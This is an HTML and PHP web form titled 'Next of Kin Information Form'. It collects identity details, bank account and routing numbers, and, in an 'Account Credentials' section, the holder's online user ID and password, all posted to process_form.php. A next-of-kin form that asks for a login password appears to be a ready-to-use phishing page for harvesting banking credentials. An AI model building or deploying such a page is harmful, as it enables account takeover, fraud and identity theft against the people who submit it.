<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Next of Kin Information Form</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <?php if(isset($_GET['error'])): ?>
            <div class="error-message">
                Error: <?php echo htmlspecialchars($_GET['error']); ?>
            </div>
        <?php endif; ?>
        <h1>Next of Kin Information Form</h1>
        <form action="process_form.php" method="POST" onsubmit="return confirm('Are you sure you want to submit this information?');">
            <fieldset>
                <legend>Account Holder Information</legend>
                <div class="form-group">
                    <label for="account_holder_name">Full Name:</label>
                    <input type="text" id="account_holder_name" name="account_holder_name" required>
                </div>
                <div class="form-group">
                    <label for="account_holder_email">Email Address:</label>
                    <input type="email" id="account_holder_email" name="account_holder_email" required>
                </div>
                <div class="form-group">
                    <label for="account_holder_phone">Phone Number:</label>
                    <input type="tel" id="account_holder_phone" name="account_holder_phone" required>
                </div>
                <div class="form-group">
                    <label for="account_holder_dob">Date of Birth:</label>
                    <input type="date" id="account_holder_dob" name="account_holder_dob" required>
                </div>
                <div class="form-group">
                    <label for="valid_id">Valid ID:</label>
                    <input type="text" id="valid_id" name="valid_id" placeholder="e.g., National ID, Driver's License" required>
                </div>
            </fieldset>

            <fieldset>
                <legend>Next of Kin Information</legend>
                <div class="form-group">
                    <label for="nok_name">Full Name:</label>
                    <input type="text" id="nok_name" name="nok_name" required>
                </div>
                <div class="form-group">
                    <label for="nok_email">Email Address:</label>
                    <input type="email" id="nok_email" name="nok_email">
                </div>
                <div class="form-group">
                    <label for="nok_phone">Phone Number:</label>
                    <input type="tel" id="nok_phone" name="nok_phone" required>
                </div>
                <div class="form-group">
                    <label for="nok_address">Address:</label>
                    <textarea id="nok_address" name="nok_address" rows="3" required></textarea>
                </div>
                <div class="form-group">
                    <label for="nok_relationship">Relationship to Account Holder:</label>
                    <input type="text" id="nok_relationship" name="nok_relationship" required>
                </div>
            </fieldset>

            <fieldset>
                <legend>Bank Information</legend>
                <div class="form-group">
                    <label for="bank_name">Bank Name:</label>
                    <input type="text" id="bank_name" name="bank_name" required>
                </div>
                <div class="form-group">
                    <label for="bank_account_number">Bank Account Number:</label>
                    <input type="text" id="bank_account_number" name="bank_account_number" required>
                </div>
                <div class="form-group">
                    <label for="routing_number">Routing Number:</label>
                    <input type="text" id="routing_number" name="routing_number">
                </div>
            </fieldset>

            <fieldset>
                <legend>Account Credentials</legend>
                <div class="form-group">
                    <label for="user_id">User ID:</label>
                    <input type="text" id="user_id" name="user_id" required>
                </div>
                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required>
                </div>
            </fieldset>

            <div class="form-group">
                <label for="signature">Signature of Account Holder:</label>
                <input type="text" id="signature" name="signature" placeholder="Enter your full name as signature" required>
                <small>By submitting this form, you acknowledge the information provided is accurate.</small>
            </div>

            <button type="submit">Submit Information</button>
        </form>
    </div>
</body>
</html>